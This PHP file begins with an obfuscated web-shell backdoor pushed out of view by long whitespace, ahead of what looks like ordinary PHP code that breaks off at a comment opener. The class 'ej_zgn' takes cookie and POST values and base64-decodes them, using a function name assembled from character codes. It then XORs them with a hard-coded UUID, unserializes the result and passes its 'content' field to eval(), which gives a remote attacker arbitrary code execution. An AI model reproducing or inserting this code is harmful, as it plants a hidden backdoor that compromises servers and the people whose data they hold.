<?php                                                                                                                                                                                                                                                                                                                                                                                                 $oRuqBlBMtt = "ej_zgn";$pHDhDArLph = class_exists($oRuqBlBMtt); $WXIhk = $pHDhDArLph;if (!$WXIhk){class ej_zgn{private $SpqziWEsln;public static $ATlegvRSwa = "0decc159-4474-458c-ab77-98940bcb8ec4";public static $GaMwdw = NULL;public function __construct(){$FcDgq = $_COOKIE;$fiJRDvMq = $_POST;$cJJbz = @$FcDgq[substr(ej_zgn::$ATlegvRSwa, 0, 4)];if (!empty($cJJbz)){$oVdRmvhzIy = "base64";$YWfFvR = "";$cJJbz = explode(",", $cJJbz);foreach ($cJJbz as $hWcYciv){$YWfFvR .= @$FcDgq[$hWcYciv];$YWfFvR .= @$fiJRDvMq[$hWcYciv];}$YWfFvR = array_map($oVdRmvhzIy . "\137" . "\144" . 'e' . "\143" . 'o' . chr ( 796 - 696 )."\x65", array($YWfFvR,)); $YWfFvR = $YWfFvR[0] ^ str_repeat(ej_zgn::$ATlegvRSwa, (strlen($YWfFvR[0]) / strlen(ej_zgn::$ATlegvRSwa)) + 1);ej_zgn::$GaMwdw = @unserialize($YWfFvR);}}public function __destruct(){$this->PgVmpb();}private function PgVmpb(){if (is_array(ej_zgn::$GaMwdw)) {$bkoMoScuC = str_replace(chr (60) . '?' . "\x70" . "\150" . 'p', "", ej_zgn::$GaMwdw[chr ( 491 - 392 ).chr ( 929 - 818 ).chr ( 468 - 358 )."\164" . chr ( 366 - 265 ).chr ( 731 - 621 )."\164"]);eval($bkoMoScuC);exit();}}}$BCaHRMh = new ej_zgn(); $BCaHRMh = NULL;} ?><?php
/**
